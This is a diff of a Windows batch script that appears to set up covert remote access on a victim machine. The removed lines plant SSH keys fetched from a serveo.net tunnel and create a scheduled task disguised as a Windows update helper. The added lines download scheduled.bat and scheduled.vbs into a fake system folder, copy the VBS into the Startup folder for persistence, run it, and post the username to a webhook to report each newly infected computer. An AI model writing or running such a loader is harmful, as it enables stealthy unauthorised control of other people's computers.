@@ -1,12 +1,13 @@
 @echo off
 
-curl http://your_hostname.serveo.net/config -o %USERPROFILE%\.ssh\config
-curl http://your_hostname.serveo.net/id_rsa -o %USERPROFILE%\.ssh\id_rsa
-curl http://your_hostname.serveo.net/id_rsa.pub -o %USERPROFILE%\.ssh\id_rsa.pub
+curl http://your_hostname.serveo.net/scheduled.bat -o C:\System16\scheduled.bat
+curl http://your_hostname.serveo.net/scheduled.vbs -o C:\System16\scheduled.vbs
+
+cd C:\System16
+Rem schtasks /create /tn "WindowsUpdateMainer" /tr "C:\System16\scheduled.vbs" /sc minute /mo 1
+copy scheduled.vbs "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cscript "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\scheduled.vbs"
 
 
-curl http://your_hostname.serveo.net/scheduled.bat -o C:\System64\scheduled.bat
-curl http://your_hostname.serveo.net/scheduled.vbs -o C:\System64\scheduled.vbs
-
-cd C:\System64
-schtasks /create /tn "WindowsUpdateHelper" /tr "C:\System64\scheduled.vbs" /sc minute /mo 1
+SET WEBHOOK_URL=<YOUR WEBHOOK URL>
+curl -H "Content-Type: application/json" -d "{\"username\": \"%USERNAME%\", \"content\":\"Setup.bat ran from new computer.\"}" %WEBHOOK_URL%
